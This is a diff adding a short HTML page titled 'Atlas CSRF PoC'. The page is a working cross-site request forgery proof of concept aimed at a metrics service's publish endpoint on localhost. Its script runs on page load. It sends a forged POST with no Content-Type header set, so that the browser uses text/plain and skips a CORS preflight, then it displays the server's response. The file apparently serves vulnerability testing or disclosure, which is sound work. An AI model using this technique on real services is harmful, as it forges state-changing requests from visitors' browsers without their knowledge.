@@ -1,0 +1,32 @@
+<!doctype html>
+<meta charset="utf-8" />
+<h3>Atlas CSRF PoC</h3>
+<pre id="out">Sending...</pre>
+
+<script>
+(async () => {
+  const ts = Date.now();
+  const body = JSON.stringify({
+    metrics: [
+      { tags: { name: "csrf.browser.metric", id: "b1" }, timestamp: ts, value: 1.0 }
+    ]
+  });
+
+  try {
+    const r = await fetch("http://localhost:7101/api/v1/publish", {
+      method: "POST",
+      // DO NOT set headers → browser will use text/plain;charset=UTF-8
+      body
+    });
+
+    const text = await r.text().catch(() => "");
+    document.getElementById("out").textContent =
+      `POST done\nstatus=${r.status}\n` +
+      `content-type-sent=(browser default)\n\n` +
+      `response (first 500 chars):\n${text.slice(0, 500)}`;
+
+  } catch (e) {
+    document.getElementById("out").textContent = "Fetch failed: " + (e && e.message ? e.message : e);
+  }
+})();
+</script>
